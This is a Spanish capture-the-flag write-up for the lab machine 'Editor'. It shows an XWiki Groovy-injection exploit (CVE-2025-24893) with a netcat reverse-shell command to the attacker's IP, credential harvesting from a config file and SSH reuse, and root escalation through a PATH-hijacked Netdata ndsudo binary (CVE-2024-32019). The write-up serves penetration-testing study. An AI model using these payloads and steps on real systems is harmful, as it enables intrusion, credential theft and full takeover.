
# Editor

<figure><img src="/files/AoHbCRN23MBMD05tTBSD" alt=""><figcaption></figcaption></figure>

## <mark style="color:purple;">Información General</mark>

* **Nombre de la máquina:** `Editor`
* **IP:** `10.10.11.80`
* **Sistema operativo:** `Linux`
* **Dificultad:** `🟢 Fácil`
* **Fecha:** `16-09-2025`

***

## <mark style="color:purple;">Reconocimiento Inicial</mark>

#### Añadimos la IP al /etc/hosts

```bash
sudo echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```

### Escaneo de Puertos

```bash
sudo nmap -v -sV -T5 10.10.11.80
```

```bash
PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
80/tcp   open  http    nginx 1.18.0 (Ubuntu)
8080/tcp open  http    Jetty 10.0.20
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Encontramos 2 puertos comunes (`22 y 80`) abiertos y un puerto `8080` que corre `Jetty 10.0.20`. Nos centraremos en el servicio web y en el puerto `8080`.

### Acceso Web

Accedemos a `http://editor.htb` y observamos que parece ser un editor de código para Windows y Linux:

<figure><img src="/files/qBa15narUmgRz5LnrSrL" alt=""><figcaption></figcaption></figure>

El puerto 8080 solamente es una wiki de cómo funciona el editor:

<figure><img src="/files/C78F6Huve3lvEIC06mMj" alt=""><figcaption></figcaption></figure>

### Instalación del editor

Nos descargaremos el binario para Linux y lo instalaremos siguiendo los pasos de su wiki:

```
http://editor.htb:8080/xwiki/bin/view/Main/Installation/
```

```bash
# Download the .deb package 
curl -LO http://editor.htb/assets/simplistcode_1.0.deb

# Install the package
sudo dpkg -i simplistcode_1.0.deb

# Launch SimplistCode Pro
simplistcode
```

Al ejecutarlo nos lanza la aplicación, pero en principio no vemos nada extraño o que nos llame la atención a simple vista:

<figure><img src="/files/0dPmRZ97TtpgnPQTiFQi" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Enumeración Web</mark>

### Fuzzing de Directorios

El fuzzing no nos devuelve ninguna ruta ni archivo interesante:

```bash
ffuf -u http://editor.htb/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://editor.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/Web-Content/common.txt
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

assets                  [Status: 301, Size: 178, Words: 6, Lines: 8, Duration: 39ms]
index.html              [Status: 200, Size: 631, Words: 83, Lines: 16, Duration: 47ms]
:: Progress: [4746/4746] :: Job [1/1] :: 1117 req/sec :: Duration: [0:00:04] :: Errors: 0 ::
```

***

## <mark style="color:purple;">Enumeración de Subdominios (VHosts)</mark>

#### Comprobación de Content-Length

```bash
curl -s -I http://10.10.11.80 -H "Host: defnotvalid.editor.htb" | grep "Content-Length:"

Content-Length: 154
```

#### Fuzzing con FFUF

```bash
ffuf -w /usr/share/seclists/Discovery/DNS/namelist.txt:FUZZ -u http://10.10.11.80/ -H 'Host: FUZZ.editor.htb' -fs 154

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.10.11.80/
 :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/namelist.txt
 :: Header           : Host: FUZZ.editor.htb
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 154
________________________________________________

wiki                    [Status: 302, Size: 0, Words: 1, Lines: 1, Duration: 276ms]
```

Solamente encontramos el subdominio wiki que ya vimos antes, por lo que parece un callejón sin salida, pero mirando mejor, en el footer de la wiki nos encontramos una versión, que posiblemente tenga un CVE asociado:

<figure><img src="/files/lUZsfx4csSDBkZtvBy24" alt=""><figcaption></figcaption></figure>

***

## <mark style="color:purple;">Explotación</mark>

### Investigación de CVEs / Exploits

Exploramos CVEs relacionados con `XWiki Debian 15.10.8` y encontramos el siguiente exploit que nos permite RCE en el objetivo:

<figure><img src="/files/wyg9KofZprJl32CzPhWm" alt=""><figcaption></figcaption></figure>

{% embed url="<https://github.com/gunzf0x/CVE-2025-24893>" %}

### Ejecución del Exploit

Ejecutamos el exploit y conseguimos una shell en Netcat:

```bash
python3 CVE-2025-24893.py -t http://editor.htb:8080/ -c 'busybox nc 10.10.14.226 4444 -e /bin/bash' 

[*] Attacking http://editor.htb:8080/
[*] Injecting the payload:
http://editor.htb:8080/xwiki/bin/get/Main/SolrSearch?media=rss&text=%7D%7D%7B%7Basync%20async%3Dfalse%7D%7D%7B%7Bgroovy%7D%7D%22busybox%20nc%2010.10.14.226%204444%20-e%20/bin/bash%22.execute%28%29%7B%7B/groovy%7D%7D%7B%7B/async%7D%7D
[*] Command executed

~Happy Hacking
```

<figure><img src="/files/kIp0ICZoTKk4P4oetx10" alt=""><figcaption></figcaption></figure>

### TTY Shell

Tenemos una shell limitada, por lo que haremos el tratamiento de la TTY:

```bash
python3 -c 'import pty;pty.spawn("/bin/bash")'
export TERM=xterm

xwiki@editor:/usr/lib/xwiki-jetty$ 
```

#### Referencia

{% embed url="<https://www.xwiki.org/xwiki/bin/view/Documentation/AdminGuide/Configuration/>" %}

### Archivo de configuración de Xwiki

Encontramos credenciales en el archivo de configuración de Xwiki `hibernate.cfg.xml`:

```shell-session
xwiki@editor:/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF$ ls

cache				jetty-web.xml  version.properties
classes				lib	      web.xml
fonts				observation    xwiki.cfg
hibernate.cfg.xml		portlet.xml    xwiki-locales.txt
jboss-deployment-structure.xml	sun-web.xml    xwiki.properties
```

```shell-session
xwiki@editor:/usr/lib/xwiki-jetty/webapps/xwiki/WEB-INF$ cat hibernate.cfg.xml | grep password

    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <----SNIP---->
```

Si navegamos hasta el directorio home encontramos un usuario oliver:

```shell-session
xwiki@editor:/$ cd home

xwiki@editor:/home$ ls
oliver
```

Por lo que probaremos a conectarnos por SSH con este usuario.

### Acceso SSH

```shell-session
afsh4ck@kali$ ssh oliver@10.10.11.80

The authenticity of host '10.10.11.80 (10.10.11.80)' can't be established.
ED25519 key fingerprint is SHA256:TgNhCKF6jUX7MG8TC01/MUj/+u0EBasUVsdSQMHdyfY.
This host key is known by the following other names/addresses:
    ~/.ssh/known_hosts:4: [hashed name]
    ~/.ssh/known_hosts:9: [hashed name]
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.11.80' (ED25519) to the list of known hosts.
oliver@10.10.11.80's password: 
Welcome to Ubuntu 22.04.5 LTS (GNU/Linux 5.15.0-151-generic x86_64)

oliver@editor:~$ whoami
oliver
```

Estamos dentro!

***

## <mark style="color:purple;">User Flag</mark>

```bash
oliver@editor:~$ ls
nvme  nvme.c  user.txt

oliver@editor:~$ cat user.txt 
75e57a0a574ba60d3f6f766db*******
```

***

## <mark style="color:purple;">Escalada de Privilegios</mark>

### Enumeración de Privilegios

No tenemos sudo como el usuario Oliver:

```shell-session
oliver@editor:/tmp$ sudo -l                                                        
[sudo] password for oliver: 
Sorry, user oliver may not run sudo on editor.
```

### Enumeración de archivos con permisos especiales

Buscando archivos con permisos especiales, encontré un archivo `ndsudo` sospechoso:

```shell-session
oliver@editor:/tmp$ find / -user root -perm -4000 -print 2>/dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
```

Buscando un poco en internet encontramos que es vulnerable al `CVE-2024-32019`, y encontramos este PoC con los pasos que tenemos que ejecutar:

{% embed url="<https://github.com/sPhyos/cve-2024-32019-PoC>" %}

### Pasos de explotación

#### 1. Guarda el sigiente código en C en Kali Linux cómo `nvme.c`:

```c
#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

int main() {
    setuid(0);
    setgid(0);
    execl("/bin/bash", "bash", NULL);
    return 0;
}
```

#### 2. Compila el exploit en Kali y envia el binario (no hay gcc en la máquina)

```bash
gcc nvme.c -o nvme
```

```shell-session
python3 -m http.server 80
oliver@editor:/tmp$ wget http://10.10.14.226/nvme
```

#### 3. Setup del entorno

```bash
mkdir -p /tmp/fakebin
mv nvme /tmp/fakebin/
chmod +x /tmp/fakebin/nvme
```

#### **4. Modifica el `PATH`**

```bash
export PATH=/tmp/fakebin:$PATH
```

#### **5. Ejecución del exploit**

```shell-session
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list

root@editor:/tmp# whoami
root
```

***

## 👑 <mark style="color:purple;">Root Flag</mark>

```shell-session
root@editor:/tmp# cd /root

root@editor:/root# ls
root.txt  scripts  snap

root@editor:/root# cat root.txt 
960a7af3a78ca183128cdf0d9*******
```
